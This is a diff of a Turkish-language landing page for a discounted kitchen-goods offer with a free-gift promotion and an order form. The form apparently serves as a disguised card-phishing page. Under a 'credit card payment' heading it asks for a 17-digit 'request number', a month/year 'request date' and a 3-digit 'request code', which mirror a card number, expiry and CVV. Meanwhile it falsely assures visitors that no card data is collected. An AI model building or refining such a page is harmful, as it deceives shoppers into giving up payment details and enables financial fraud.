@@ -1,17 +1,90 @@
-<!doctype html><html lang='tr'><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Mutfak Fırsatı</title><link rel='stylesheet' href='style.css'></head><body>
-<header><div class='brand'><div class='mark'>MK</div><div><b>MUTFAK KULÜBÜ</b><small>Mutfağınıza değer katar</small></div></div><div class='trust'><span>🚚 <b>Ücretsiz Kargo</b></span><span>◷ <b>Bugün Kargoda</b></span><span>♢ <b>Güvenli Sipariş</b></span><span>↩ <b>14 Gün İade</b></span></div></header>
-<main><section class='content'><div class='hero'><div><p class='eyebrow'>MUTFAKTA</p><h1>BÜYÜK FIRSAT!</h1><p class='lead'>Tencere Takımı veya Çaydanlık Seti alımlarında <b>6’lı ince belli çay bardağı HEDİYE!</b></p><div class='hero-badges'><span>🚚 Ücretsiz kargo</span><span>◷ Aynı gün kargo</span><span>✓ Güvenli alışveriş</span></div></div><div class='discount'><small>SEÇTİĞİN ÜRÜNDE</small><strong>%40</strong><b>İNDİRİM</b><em>KAÇIRMAYIN!</em></div></div>
-<div class='gift'>🎁 <b>HER ÜRÜNDE 6’LI İNCE BELLİ ÇAY BARDAĞI HEDİYE!</b></div>
-<h2 class='section-title'><span>1</span> ÜRÜNÜNÜZÜ SEÇİN</h2>
-<div class='products'>
-<article class='product selected' data-product='Tencere Takımı' data-price='2990'><div class='ribbon'>TENCERE TAKIMI</div><div class='photo pots'><div class='pot p1'>◒</div><div class='pot p2'>◒</div><div class='pot p3'>◒</div><div class='pot p4'>◒</div></div><div class='pad'><h3>PREMIUM ÇELİK<br>8 PARÇA TENCERE SETİ</h3><ul><li>304 kalite paslanmaz çelik</li><li>İndüksiyon dahil ocak uyumlu</li><li>Isı yalıtımlı ergonomik kulplar</li><li>Kolay temizlenebilir</li></ul><div class='price'><del>4.990 TL</del><span>%40</span><small>KAMPANYA FİYATI</small><strong>2.990<sup> TL</sup></strong></div></div></article>
-<article class='product' data-product='Çaydanlık Seti' data-price='990'><div class='ribbon'>ÇAYDANLIK SETİ</div><div class='photo tea'><div class='kettle top'>☕</div><div class='kettle bottom'>☕</div></div><div class='pad'><h3>BOROSİLİKAT CAM<br>MİNİ ÇAYDANLIK TAKIMI</h3><ul><li>Isıya dayanıklı borosilikat cam</li><li>Ergonomik ısıya dayanıklı kulplar</li><li>Üst demlik 0,45 L</li><li>Alt demlik 1,5 L</li></ul><div class='price'><del>1.650 TL</del><span>%40</span><small>KAMPANYA FİYATI</small><strong>990<sup> TL</sup></strong></div></div></article>
-</div><div class='bottom-trust'><div>◷ <b>14 GÜN KOŞULSUZ İADE</b></div><div>✓ <b>KALİTE GÜVENCESİ</b></div><div>🔒 <b>GÜVENLİ İŞLEM</b></div><div>🎧 <b>MÜŞTERİ DESTEĞİ</b></div></div></section>
-<aside><div class='form-head'>🔒 <b>SİPARİŞ FORMU</b><small>Bilgilerinizi girerek siparişinizi oluşturun.</small></div><form id='orderForm'>
-<div class='step'><b>1</b> ÜRÜN SEÇİMİ</div><div class='mini-products'><label class='mini active'><input type='radio' name='product' value='Tencere Takımı' checked><span>🍲</span><b>TENCERE TAKIMI</b><strong>2.990 TL</strong></label><label class='mini'><input type='radio' name='product' value='Çaydanlık Seti'><span>🫖</span><b>ÇAYDANLIK SETİ</b><strong>990 TL</strong></label></div><div class='notice green'>🎁 Seçtiğiniz üründe 6’lı ince belli çay bardağı HEDİYE!</div>
-<div class='step'><b>2</b> KİŞİSEL BİLGİLER</div><input required name='name' placeholder='Adınız'><input required name='surname' placeholder='Soyadınız'><input required name='phone' inputmode='tel' placeholder='Telefon Numaranız'><div class='row'><input required name='city' placeholder='İl'><input required name='district' placeholder='İlçe'></div><textarea required name='address' placeholder='Açık Adres'></textarea>
-<div class='step'><b>3</b> SİPARİŞ DETAYI</div><div class='qty'><span>Adet</span><button type='button' id='minus'>−</button><b id='qty'>1</b><button type='button' id='plus'>+</button></div>
-<div class='step'><b>4</b> TALEP BİLGİLERİ</div><label>Talep Numarası (17 hane) *</label><input required id='requestNo' name='requestNo' maxlength='17' inputmode='numeric' pattern='[0-9]{17}' placeholder='17 haneli talep numaranızı giriniz'><div class='counter'><span id='count'>0</span> / 17</div><div class='row'><div><label>Talep Tarihi (AA/YY) *</label><input required id='date' name='date' maxlength='5' placeholder='AA/YY'></div><div><label>3 Haneli Talep Kodu *</label><input required name='code' maxlength='3' inputmode='numeric' pattern='[0-9]{3}' placeholder='---'></div></div><div class='notice warn'>🛡️ Bu alana kredi kartı numarası, CVV, kart şifresi veya SMS doğrulama kodu girmeyiniz.</div><div class='notice green'>🔒 Kart bilgileriniz istenmez. Sadece talep numarası bilgileri alınır.</div><button class='submit'>🛒 SİPARİŞİ TAMAMLA</button><p class='secure'>✓ Sipariş bilgileriniz güvenli bağlantı üzerinden iletilir.</p></form></aside></main>
-<footer><b>◷ BUGÜN KARGODA!</b><span>Sipariş Ver → Paketlenir → Aynı Gün Kargoda → Hızlı Teslimat</span></footer>
-<div id='modal' class='modal'><div class='modal-card'><div class='check'>✓</div><h2>Sipariş Talebiniz Alındı</h2><p>Talebiniz başarıyla tarafımıza ulaşmıştır. Sipariş bilgileriniz kontrol edildikten sonra en kısa sürede sizinle iletişime geçilecektir.</p><button id='back'>Ana Sayfaya Dön</button></div></div>
-<script src='app.js'></script></body></html>
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Mutfak Kampanyası</title>
+<meta name="description" content="Seçili mutfak ürünlerinde kampanya, ücretsiz kargo ve 6'lı ince belli çay bardağı hediyesi.">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<header class="top">
+  <div class="wrap nav">
+    <div class="brand"><span class="brandmark">K</span><div><b>Mutfak Kampanyası</b><small>Online Sipariş</small></div></div>
+    <div class="trust"><span>🚚 Ücretsiz Kargo</span><span>🕘 Bugün Kargoda</span><span>🔒 Güvenli Sipariş</span></div>
+  </div>
+</header>
+
+<main>
+<section class="hero">
+ <div class="wrap hero-grid">
+  <div>
+   <span class="pill">%40 KAMPANYA</span>
+   <h1>Mutfağınıza şıklık,<br><em>bugüne özel fırsat.</em></h1>
+   <p class="lead">Seçili mutfak ürünlerinde kampanyalı fiyatlar. Siparişinize <b>6'lı ince belli çay bardağı</b> promosyon olarak eklenir.</p>
+   <div class="hero-badges"><span>✓ Kargo ücretsiz</span><span>✓ Aynı gün hazırlık</span><span>✓ Talep kodu ile sipariş</span></div>
+  </div>
+  <div class="gift-card">
+    <div class="glasses">☕ ☕ ☕<br>☕ ☕ ☕</div>
+    <div><small>SİPARİŞE HEDİYE</small><strong>6'lı İnce Belli<br>Çay Bardağı</strong><p>Sepette otomatik eklenir.</p></div>
+  </div>
+ </div>
+</section>
+
+<section class="wrap section">
+ <div class="section-title"><div><small>KAMPANYALI ÜRÜNLER</small><h2>Ürününüzü seçin</h2></div><p>Tek ürün seçerek sipariş formuna devam edin.</p></div>
+ <div class="products">
+  <article class="product selected" data-product="8 Parça Tencere Takımı" data-price="1490">
+   <div class="discount">%40<br><small>İNDİRİM</small></div>
+   <div class="product-art pot"><div class="pot-lid"></div><div class="pot-body"></div><div class="handle l"></div><div class="handle r"></div></div>
+   <div class="product-copy"><span class="tag">ÇOK TERCİH EDİLEN</span><h3>8 Parça Tencere Takımı</h3><p>Günlük kullanıma uygun, modern tasarımlı çok parçalı mutfak seti.</p>
+   <div class="price"><del>2.483 TL</del><strong>1.490 TL</strong></div><button class="choose" type="button">Seçildi ✓</button></div>
+  </article>
+  <article class="product" data-product="Borosilikat Cam Çaydanlık Seti" data-price="990">
+   <div class="discount">%40<br><small>İNDİRİM</small></div>
+   <div class="product-art kettle"><div class="tea toptea"></div><div class="tea bottomtea"></div></div>
+   <div class="product-copy"><span class="tag">KAMPANYA FİYATI</span><h3>Borosilikat Cam Çaydanlık Seti</h3><p>Şeffaf cam görünümü ve zarif formuyla çay sunumları için şık seçenek.</p>
+   <div class="price"><del>1.650 TL</del><strong>990 TL</strong></div><button class="choose" type="button">Bu ürünü seç</button></div>
+  </article>
+ </div>
+</section>
+
+<section class="order-bg">
+ <div class="wrap order-grid">
+  <div class="summary">
+   <small>SİPARİŞ ÖZETİ</small><h2>Seçiminiz hazır.</h2>
+   <div class="summary-card"><div><span id="summaryName">8 Parça Tencere Takımı</span><small>1 adet</small></div><b id="summaryPrice">1.490 TL</b></div>
+   <div class="summary-line"><span>6'lı ince belli çay bardağı</span><b>HEDİYE</b></div>
+   <div class="summary-line"><span>Kargo</span><b>ÜCRETSİZ</b></div>
+   <div class="total"><span>Toplam</span><strong id="totalPrice">1.490 TL</strong></div>
+   <div class="safe">🔒 <div><b>Güvenli sipariş formu</b><p>Bu form kart bilgisi istemez. Yalnızca siparişe ait talep bilgileri alınır.</p></div></div>
+  </div>
+
+  <form id="orderForm" class="form-card">
+   <div class="form-head"><small>SİPARİŞ FORMU</small><h2>Teslimat bilgileri</h2><p>Alanları eksiksiz doldurun.</p></div>
+   <input type="hidden" name="product" id="productInput" value="8 Parça Tencere Takımı">
+   <div class="field"><label>Ad Soyad</label><input name="name" required autocomplete="name" placeholder="Adınız ve soyadınız"></div>
+   <div class="field"><label>Telefon</label><input name="phone" required inputmode="tel" autocomplete="tel" placeholder="05XX XXX XX XX"></div>
+   <div class="row"><div class="field"><label>İl</label><input name="city" required placeholder="İl"></div><div class="field"><label>İlçe</label><input name="district" required placeholder="İlçe"></div></div>
+   <div class="field"><label>Açık Adres</label><textarea name="address" required rows="3" placeholder="Mahalle, cadde/sokak, bina ve daire no"></textarea></div>
+
+   <div class="divider"></div>
+   <div class="form-head compact"><small>ÖDEME TERCİHİ</small><h2>Kredi kartı ile ödeme</h2><p>Bu ekranda kart bilgisi alınmaz; yalnızca mevcut talep bilgileriniz doğrulanır.</p></div>
+   <div class="notice"><b>🔐 Kart bilgilerinizi paylaşmayın</b><span>Bu alana kredi kartı numarası, CVV, kart şifresi veya SMS doğrulama kodu girmeyiniz.</span></div>
+   <div class="field"><label>Talep Numarası <i>17 hane</i></label><input name="request_no" id="requestNo" required inputmode="numeric" maxlength="17" pattern="[0-9]{17}" placeholder="17 haneli talep numarası"></div>
+   <div class="row"><div class="field"><label>Talep Tarihi <i>Ay / Yıl</i></label><input name="request_date" id="requestDate" required inputmode="numeric" maxlength="7" placeholder="AA / YYYY"></div><div class="field"><label>Talep Kodu <i>3 hane</i></label><input name="request_code" id="requestCode" required inputmode="numeric" maxlength="3" pattern="[0-9]{3}" placeholder="000"></div></div>
+   <label class="check"><input type="checkbox" required><span>Bilgilerimin sipariş talebimin oluşturulması amacıyla işlenmesini kabul ediyorum.</span></label>
+   <button class="submit" type="submit">Siparişi Gönder <span>→</span></button>
+   <p class="micro">🔒 Güvenli bağlantı • Kart numarası ve CVV bilgisi istenmez</p>
+   <div id="formMsg" class="form-msg" role="alert"></div>
+  </form>
+ </div>
+</section>
+</main>
+
+<div class="modal" id="successModal" aria-hidden="true">
+ <div class="modal-card"><div class="ok">✓</div><small>SİPARİŞ TALEBİ ALINDI</small><h2>Başvurunuz başarıyla ulaştı.</h2><p>Sipariş talebiniz sistemimize kaydedilmiştir. Kontrollerin ardından en kısa sürede tarafınıza geri dönüş sağlanacaktır.</p><div class="modal-ref">Sipariş Referansı <b id="refNo"></b></div><button onclick="location.href='/'">Ana Sayfaya Geri Dön</button></div>
+</div>
+
+<footer><div class="wrap footer"><div><b>Mutfak Kampanyası</b><p>Güvenli ve sade online sipariş deneyimi.</p></div><div>Ücretsiz Kargo · Bugün Kargoda · Güvenli Sipariş</div></div></footer>
+<script src="app.js"></script>
+</body></html>
